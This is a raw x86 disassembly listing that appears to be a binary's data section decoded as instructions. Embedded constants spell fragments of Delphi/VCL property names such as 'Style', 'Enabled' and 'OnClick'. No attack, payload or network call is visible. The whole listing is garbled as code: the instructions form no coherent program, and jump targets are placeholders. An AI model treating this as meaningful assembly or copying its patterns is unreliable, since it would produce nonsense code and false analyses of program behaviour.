add [ eax ] al
inc ebx
add [ eax ] al
push esp
js r-xdata
mov esp 0x16004155
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x1c00430b ] bl
add [ eax ] al
add [ edi + ebx * 2 ] bh
or esi [ eax + 0x73 ]
dec edi
ja r-xdata
add [ eax + 0x42080002 ] al
jae r-xdata
jb r-xdata
add [ ecx ] 0x0
add [ eax ] al
add [ eax ] eax
add eax 0x65766542
insb
popad
outsb
insb
insb
or eax [ ebx ]
enter 0x415f 0x0
pop es
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
push edx
popad
imul esi [ ebx + 0x65 ] 0x6f430864
jb r-xdata
insb
jae r-xdata
add [ eax + 0x430b ] dh
ja r-xdata
add bh bh
je r-xdata
add [ eax + 0x55 ] cl
inc ecx
add [ eax + eax ] dl
fmul [ edx ]
inc ebx
add [ ebx ] al
adc [ ebx + edx * 2 + 0x74 ] edx
popad
inc ebx
outsd
insd
inc ebx
je r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x65646f
adc [ eax ] al
pop ss
add [ eax ] al
add [ eax ] cl
inc edx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax ] al
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
xor eax [ eax ]
jae r-xdata
inc ecx
add [ ebx + esi + 0x33900040 ] al
inc eax
cmp al 0x5f
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
sahf
or eax [ ebx ]
sbb al 0x0
popad
outsb
insb
inc edx
jbe r-xdata
add [ eax ] al
add [ eax + 0x600430a ] bl
or al [ ebx ]
add edx [ ecx ]
push esp
push ebx
je r-xdata
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
cmp al 0x8f
jo r-xdata
insb
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al bl
or al [ ebx ]
push es
add [ eax ] al
add [ eax + eax ] bl
je r-xdata
sub_430c42
fcom [ edx + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add eax [ eax ]
push cs
push eax
popad
jb r-xdata
imul esp [ esp + esi * 2 + 0x68 ] 0xd10c08b
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + ecx + 0x43 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
or eax 0xd400043
inc ebx
add [ eax + eax ] bl
add [ eax ] al
hlt
outsb
je r-xdata
push esp
js r-xdata
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9865646f
or al [ ebx ]
sbb [ eax ] al
add bh bh
xchg esp eax
push ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add al 0x0
add eax 0x6c797453
xchg esp eax
adc [ eax ] al
or al 0x0
add bh bh
movsb [ edi ] [ esi ]
push ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040005 ] al
inc ecx
add [ eax + 0xc004191 ] ah
xchg esi eax
inc ecx
add [ eax ] dl
xchg esi eax
inc ecx
add [ esi + edx * 4 ] dl
inc ecx
add al cl
xchg ebp eax
inc ecx
add [ eax + 0x54 ] ah
inc ebx
add [ eax ] bh
xchg edx eax
inc ecx
add [ edx + edx * 4 + 0x10041 ] dh
cmp al 0x10
inc eax
add [ eax ] dl
add [ eax ] al
dec esp
push ebx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x57050006 ] al
sub_4312bf
cmp al 0xbe
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
adc eax 0x6e450700
popad
bound ebp [ ebp + 0x64 ]
mov [ edx ] ch
inc edx
add [ eax ] ch
add bh bh
adc al 0x9f
inc esp
add al bl
pop esi
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040016 ] al
outsd
outsb
je r-xdata
dec esi
inc esp
add [ eax + eax ] dh
push esp
retn 0x44
sub_431300
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ebx ] cl
inc ebx
outsd
outsb
jae r-xdata
outsd
jb r-xdata
jb r-xdata
adc [ eax ] al
pop ecx
add [ eax ] al
dec [ edi + ebx * 4 + 0x44 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or edx [ eax + 0x61 ]
jb r-xdata
imul ebp [ esi + 0x74 ] 0x430d5073
add [ eax ] cl
add al [ eax ]
jmp esp
add [ eax - 0x80000000 ] al
push ds
add [ eax ] cl
push ebx
outsb
je r-xdata
add [ eax ] al
add [ eax - 0x80000000 ] al
sbb eax 0x6f500900
outsb
je r-xdata
adc [ eax ] al
adc al 0x2
add bh bh
hlt
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc eax
add [ 0x60ff0002 ] dl
pop edx
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and [ eax ] eax
or [ ebx + 0x69 ] dl
jpe r-xdata
jo r-xdata
push cs
push eax
popad
jb r-xdata
outsd
insb
adc [ eax ] al
0x94ff0000 0x449f
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
and [ eax + eax ] 0x7
dec edi
outsb
inc ebx
inc edi
jb r-xdata
adc [ eax ] al
adc [ edx ] al
add bh bh
cld
push edi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x530a0020 ] al
imul ebp [ ebp + 0x70 ] 0x6554656c
js r-xdata
outsb
jne r-xdata
add [ eax ] al
outsb
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
js r-xdata
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jo r-xdata
jmp [ eax ]
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
inc esp
add [ eax ] bh
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001e ] al
add [ eax ] al
add al [ eax ]
push esp
push esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
inc esp
jb r-xdata
push eax
outsd
jo r-xdata
adc [ eax ] al
pop ss
add al [ eax ]
push esp
pop esi
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
or eax 0x53657355
jns r-xdata
pop ds
add [ ebx ] cl
push ebx
imul ebp [ ebp + 0x70 ] 0x6150656c
outsb
insb
xchg esp eax
add [ eax ] al
mov es [ ebp ]
jl r-xdata
add [ ebx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
add al 0x57
inc ecx
add [ eax ] ch
push edi
jo r-xdata
jb r-xdata
jo r-xdata
je r-xdata
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
push esp
dec ebp
outsd
jbe r-xdata
inc esp
jb r-xdata
push ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
or eax 0x2300043
add bh bh
xor [ edx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add [ es : edx ] dl
dec edi
outsb
inc ebx
jb r-xdata
inc ebx
outsd
outsb
je r-xdata
outsb
insd
inc esi
outsd
outsb
je r-xdata
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630a
jb r-xdata
jb r-xdata
dec edi
outsb
push edx
jae r-xdata
mov eax 0xe000444f
add [ eax ] al
jmp eax
add [ eax ] al
add [ eax + 0x4f06002c ] al
dec edi
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or cl [ edi + 0x6e ]
popad
je r-xdata
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x63 ]
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
and eax [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x4656c62
push edi
inc ecx
add [ eax ] ah
add [ eax ] eax
jne r-xdata
inc ebp
jb r-xdata
jae r-xdata
inc esp
outsd
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
outsb
add eax [ eax ]
add [ eax ] al
sub al 0x17
jpe r-xdata
insb
add al 0x57
inc ecx
add al bh
add [ eax ] al
inc esp
outsd
ja r-xdata
outsb
dec eax
imul ebp [ esi + 0x74 ] r-xdata
rol [ eax ] 0x1
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0b00
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
push eax
popad
outsb
insb
inc ebx
insb
popad
jae r-xdata
je r-xdata
or ah [ fs : ebx + 0x64 ]
arpl [ ebp + 0x73 ] si
jae r-xdata
popad
jb r-xdata
inc ebp
jb r-xdata
ror [ edi + edx + 0x2030043 ] 0x2e
cmp [ ecx ] eax
jb r-xdata
jae r-xdata
or ah [ ebx + 0x64 ]
add [ eax ] al
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
push ebx
je r-xdata
or al 0x54
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
add al [ eax ]
[ eax ]
push edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ ecx ] al
add bh bh
or [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al [ eax ]
or [ edi + 0x6e ] ecx
add al 0x57
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
or al 0x70
outsd
outsb
push es
je r-xdata
popa
arpl [ ebx + esi * 2 + 0x44 ] sp
or esp [ ebx + 0x64 ]
push eax
outsd
jae r-xdata
adc [ fs : ebx + 0x64 ] ah
jne r-xdata
popad
jae r-xdata
dec ecx
jb r-xdata
add [ ebx ] cl
arpl [ ebx + esi * 2 + 0x53 ] sp
inc esp
jb r-xdata
inc ebp
add [ edx + ebx * 8 + 0x44 ] bl
add [ ebx + ecx * 4 - 0x4123ffbf ] ch
inc esp
add al dh
xchg edx eax
jpe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
popad
je r-xdata
outsb
je r-xdata
je r-xdata
jae r-xdata
push es
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
int3
inc edx
outsd
je r-xdata
add [ eax ] ch
sbb [ ebx ] al
push es
jae r-xdata
outsb
jae r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
or [ ebx + 0x6f ] al
insd
inc ebx
je r-xdata
jb r-xdata
adc [ ebx + eax * 2 + 0x75 ] dl
jns r-xdata
add [ eax ] al
add [ eax ] al
or [ eax ] al
add [ eax ] al
mov [ edi ] dl
inc ebx
add eax [ edx ]
cmp [ cs : ecx ] eax
xor [ bx ] dl
inc ebx
add [ ebx ] al
adc [ ebx + eax * 2 + 0x75 ] dl
jae r-xdata
add al ah
sbb [ ebp ] al
lodsb [ esi ]
add eax [ ebp ]
pushfd
push es
inc ebp
add [ esp + edx * 2 ] cl
push eax
jb r-xdata
add [ ecx + eax * 8 + 0x44 ] bl
add [ eax + 0x5 ] dl
inc ebp
add [ esi + eax ] cl
inc ebp
add [ eax ] cl
add [ ebp ] eax
inc esp
add [ eax ] dl
mov [ eax + eax + 0x8 ] 0x5400449c
pop ss
inc edx
inc ecx
add ah bl
mov esi 0x92f00044
outsb
je r-xdata
add [ edi + edx ] bh
inc ebx
add [ eax ] al
je r-xdata
push es
jae r-xdata
inc edx
add [ eax - 0x6fffbfcd ] dl
adc [ edx ] al
je r-xdata
bound ecx [ eax + 0x6f ]
jb r-xdata
outsd
outsb
add [ eax ] eax
add ecx [ eax - 0x6fffbce9 ]
sub al 0x18
inc ebx
add [ ebx ] al
or [ ebx + 0x64 ] esp
jae r-xdata
arpl [ ebx + esi * 2 + 0x48 ] sp
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ah
dec esi
or [ ebx + edx * 2 + 0x6f ] edx
jb r-xdata
outsd
je r-xdata
insb
jae r-xdata
sbb [ ebx ] eax
and [ edx ] al
insb
jae r-xdata
inc eax
add [ eax + 0x18 ] dh
inc ebx
add [ ebx ] al
imul ebp [ esi + 0x61 ] 0x43086574
outsd
insd
inc ebx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax + ebx + 0x43 ] ch
add [ eax + esi * 2 ] cl
outsd
insd
inc esp
jb r-xdata
or esp [ fs : ebx + 0x64 ]
jae r-xdata
jae r-xdata
outsd
insd
inc esp
jb r-xdata
arpl [ eax + 0x6f ] bp
jb r-xdata
jb r-xdata
add al dh
adc [ ebp ] eax
pop esp
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
insb
or dh [ eax + 0x62 ]
add [ ecx + edx + 0x45 ] ch
add [ ecx + edx * 4 + 0x44 ] ah
add ah al
pop es
inc ebp
add ah ah
pop es
inc ebp
add ah bh
add al 0x45
add [ eax + edx * 4 - 0x6f4fffbc ] ch
inc esp
add [ eax + eax * 8 - 0x3f27ffbc ] ch
inc esp
add al dh
fwait
inc esp
add [ eax ] ch
xchg edx eax
inc esp
add ah ch
xor [ eax ] al
or [ ecx ] dh
inc eax
add [ ebp + eax * 8 + 0x44 ] ch
add [ esp + edx ] dh
inc edx
add [ edi + edx + 0x42 ] bl
add al cl
popad
inc ebx
add [ ecx + 0x12200045 ] al
inc ebp
insb
jae r-xdata
sbb [ ebx ] eax
add [ eax ] al
push esp
js r-xdata
cwde
jb r-xdata
push esp
jns r-xdata
add [ eax ] al
add [ ebx ] al
add [ eax ] al
jae r-xdata
adc [ ebx + 0x64 ] ah
arpl [ ebx + esi * 2 + 0x4d ] sp
push ebx
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
or ecx [ edi + 0x6e ]
je r-xdata
pop ss
jb r-xdata
inc edx
popad
insb
jae r-xdata
jb r-xdata
ja r-xdata
insd
imul esi [ ebx + 0x61 ] 0x64656c62
or ah [ ebx + 0x64 ]
jae r-xdata
or esp [ ebx + 0x64 ]
jae r-xdata
ja r-xdata
add [ eax ] al
jmp [ eax ]
int3
add [ eax ] al
or al 0x0
pop es
inc ecx
outsb
jae r-xdata
add [ esp + edx ] bh
inc edx
inc esp
add [ edi + edx + 0x42 ] dl
imul esp [ ebx + 0x61 ] 0x6f43086c
insd
inc ebx
add al 0x19
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah cl
push es
push esi
add [ gs : eax ] eax
add [ eax ] al
and [ esi + 0x44 ] bl
jae r-xdata
add [ eax ] al
jb r-xdata
adc [ eax ] bl
inc ebx
add [ esi ] al
pop ss
push esp
push eax
jb r-xdata
je r-xdata
push 0x656b6365
or ah [ fs : ebx + 0x64 ]
jae r-xdata
insb
arpl [ gs : ebp + 0x64 ] si
or [ ebx + 0x64 ] esp
jae r-xdata
je r-xdata
insb
add [ eax ] eax
inc edx
popad
jb r-xdata
loop r-xdata
inc edx
add [ eax - 0x6bffbfcd ] bl
xor eax [ eax ]
xchg esp eax
inc eax
add [ eax - 0x67ffbdf0 ] dl
jae r-xdata
outsd
push ebx
inc ebx
add [ edx ] cl
arpl [ eax + edx * 2 + 0x72 ] sp
push eax
popad
imul ebp [ esi + 0x74 ] 0x5064630b
outsd
jae r-xdata
add [ gs : bx + si ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + edx ] ch
add [ ebp + ebx * 4 + 0x44 ] bh
add ah dh
pushfd
inc esp
add [ eax ] cl
mov al [ 0xffffffff9eb40044 ]
inc esp
add [ eax ] dh
loope r-xdata
inc eax
add al ah
sbb [ ebx ] eax
pop es
or al 0x54
push eax
jb r-xdata
add [ eax ] al
add [ eax ] al
or eax 0x6f420b00
jb r-xdata
add [ eax ] al
add [ eax ] dl
add [ eax ] cl
inc esp
jb r-xdata
jb r-xdata
or [ ebp ] al
add [ eax ] eax
add [ eax ] al
jae r-xdata
inc ebx
outsd
outsb
jae r-xdata
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
or [ edx + esi * 2 + 0x61 ] al
imul esp [ esp + esi * 2 + 0x68 ] r-xdata
jpe r-xdata
jb r-xdata
add [ ebx ] cl
inc edx
outsd
inc edx
popad
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
jb r-xdata
add bh bh
jpe r-xdata
popad
inc esp
add [ ebx ] ch
add [ eax ] cl
inc ebx
outsd
insd
inc ebx
je r-xdata
sbb [ ebx ] eax
aam 0x61
add [ eax ] al
outsb
je r-xdata
popad
je r-xdata
imul ebp [ esi + 0x74 ] 0x40103c73
add [ ebx + 0x43 ] dl
add [ eax + 0x65 ] bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax [ eax ]
add ecx [ ebp + 0x69 ]
outsb
cmp al 0x10
inc eax
add [ ebx + 0x65640043 ] cl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
and [ eax + eax ] 0x0
adc al 0x0
add ecx [ ebp + 0x61 ]
js r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
push cs
add [ edx ] cl
inc esp
jb r-xdata
insb
jae r-xdata
add [ ecx + eax + 0x950ff00 ] ah
cmp al 0x10
inc eax
add [ eax ] bl
add al [ eax ]
inc eax
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edx ] 0x0
add [ eax ] al
add [ eax ] al
add al [ eax ]
call [ eax ]
push 0x6948776f
outsb
je r-xdata
or [ eax + 0x6f ] dl
jae r-xdata
push ss
add [ esi ] cl
push eax
popad
jb r-xdata
outsd
outsb
add [ eax ] dl
inc eax
add [ edx - 0x6b010000 ] bl
lahf
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
jne r-xdata
sbb [ ebx ] al
sbb al 0x2
add bh bh
cld
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc eax 0x724f0b00
imul esp [ ebp + 0x6e ] 0x69746174
add [ eax ] eax
add [ eax ] al
adc [ eax ] eax
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
xchg esp eax
adc [ eax ] al
add [ eax ] 0x0
inc ebx
jne r-xdata
push esp
dec esi
inc esp
add [ ecx ] ah
add bh bh
je r-xdata
add [ edi + eax * 2 ] ch
inc esp
add [ ebx ] bl
add bh bh
xor al 0x93
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
adc [ eax ] al
push edi
add [ eax ] al
inc [ eax - 0x63 ]
inc esp
add [ esi + edi * 4 + 0x44 ] bl
add [ eax + 0x1 ] al
push ds
add [ edi ] al
push esi
imul esi [ ebx + 0x69 ] 0xe0656c62
push esi
inc esp
add [ eax ] dh
add [ eax ] eax
push [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e001f ] al
outsb
inc ebx
push ebx
je r-xdata
jo r-xdata
sbb [ eax ] eax
add [ eax ] al
mov es [ ebp ]
jl r-xdata
inc esp
add [ eax + 0x38004508 ] bh
je r-xdata
lahf
dec ebp
add bh bh
hlt
inc [ eax + 0x5cff0000 ]
mov esi 0x44
add [ eax - 0x80000000 ] al
pop es
add [ eax + ecx * 2 ] al
jae r-xdata
inc esp
inc esp
add [ eax ] dl
xchg edx eax
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
js r-xdata
outsd
jo r-xdata
jo r-xdata
inc esp
add [ eax ] bh
adc [ eax ] al
cdq
add [ eax ] al
push [ eax - 0x61 ]
add bh bh
fcomp [ ebp + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ ecx ] cl
push eax
outsd
jo r-xdata
outsd
outsb
je r-xdata
jb r-xdata
or [ ebp ] eax
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x1 ] al
sbb al 0x0
or [ ecx + 0x62 ] dl
dec edi
jb r-xdata
mov eax 0x38004508
inc bx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
outsb
add [ eax ] dl
inc eax
add [ 0x10ff0002 ] bl
jo r-xdata
dec ebp
push es
push ebx
insd
outsd
outsd
je r-xdata
adc [ eax ] al
les esp [ ebx + 0x43 ]
add [ ebp + 0x43 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul ebp [ esi + 0x74 ] r-xdata
je r-xdata
add bh bh
add [ eax ] 0x0
[ esi + edi * 4 + 0x44 ]
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x48040007 ] al
jb r-xdata
dec ebp
outsd
jne r-xdata
add al 0x57
inc ecx
add al al
push edx
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090023 ] al
outsb
push eax
outsd
jo r-xdata
inc esp
jb r-xdata
push ecx
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0021 ] al
outsb
lahf
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001b ] al
push 0x6948776f
outsb
je r-xdata
jo r-xdata
inc ebp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax + 0x9 ]
sbb [ eax ] al
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0xcc73726f
pop esp
inc esp
add [ ecx + eax ] ch
dec ebp
inc esp
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
str [ eax ]
inc esp
jb r-xdata
arpl [ ebx + 0x4 ] bp
push edx
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b002a ] al
inc esp
outsd
ja r-xdata
dec ebp
outsd
jne r-xdata
jb r-xdata
inc ebp
outsb
inc esp
add bh bh
sbb [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax [ eax ]
or [ edi + 0x6e ] ecx
jo r-xdata
add [ eax + 0x4f070024 ] al
add [ eax ] al
dec edi
jbe r-xdata
sbb al [ eax ]
add al 0x53
je r-xdata
add bh bh
shl [ ebp + 0x43 ] 0x0
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0xa ] al
outsb
jne r-xdata
add [ edi ] 0x0
add al 0x48
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
jb r-xdata
jb r-xdata
xor [ eax + 0x44 ] dl
add al bl
add [ eax ] al
popad
dec ebp
outsd
jbe r-xdata
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f060025 ] al
outsb
inc ebp
js r-xdata
push edi
inc ecx
add al cl
sbb eax 0x61540700
bound edx [ ebx + 0x74 ]
outsd
add [ eax ] al
push ecx
inc esp
add al ch
add [ eax ] al
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
push es
imul ebp [ edi + 0x6e ] r-xdata
push cs
outsd
outsb
inc esi
outsd
jb r-xdata
inc esp
jb r-xdata
call 0x44361d7
add [ eax ] al
add [ eax - 0x7bffbff0 ] dh
xor eax [ eax ]
nop
xor eax [ eax ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al ch
push ds
inc ebx
outsb
push ebx
je r-xdata
dec edi
mov eax 0xe000444f
add [ eax ] al
jmp eax
outsb
dec ebp
outsd
jne r-xdata
je r-xdata
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090022 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x4c ] bp
push edx
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsd
insb
imul esp [ ebx + ecx * 2 + 0x65 ] 0x179
add [ eax ] al
pop es
add [ eax ] al
add [ eax + 0x1f ] bh
inc ebx
add [ esi ] al
push 0x6e6f4e63
pop es
push 0x69685363
je r-xdata
or al 0x54
dec eax
dec ebx
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x1737265
sbb al 0x1f
jb r-xdata
add [ eax + r-xdata ] dl
add ecx [ 0x494b4854 ]
popad
je r-xdata
adc [ ebx + eax * 2 + 0x6f ] edx
outsb
jbe r-xdata
outsb
clc
push ds
inc ebx
add [ esi ] cl
nop
loopne r-xdata
je r-xdata
jb r-xdata
add [ eax + eax ] al
add [ eax ] al
mov al 0x10
inc eax
add [ ebx + esi + 0x33900040 ] al
inc eax
add [ ebx + esi + 0x33980040 ] dl
inc eax
add [ ebx + esi + 0x30ec0040 ] cl
inc eax
add [ eax ] cl
xor [ eax ] eax
inc esp
push ebp
jo r-xdata
jb r-xdata
inc esp
dec edi
inc esp
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0026 ] al
outsb
fiadd [ eax + eax - 0x54 ]
mov eax [ ecx ]
fdivr [ esi - 0x6d0fffbc ]
insb
jae r-xdata
add eax 0x6c416368
je r-xdata
push 0x72744363
insb
inc ebx
imul ebp [ edi + 0x6e ] 0x6d726f46
add [ eax ] al
add [ eax + r-xdata ] dl
add ecx [ ebx ]
push esp
dec eax
dec ebx
dec ebp
outsd
imul esp [ fs : esi + 0x69 ] 0x17265
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ edi + ebx ] bl
inc ebx
add [ edi ] al
push 0x6968536b
je r-xdata
add [ eax ] al
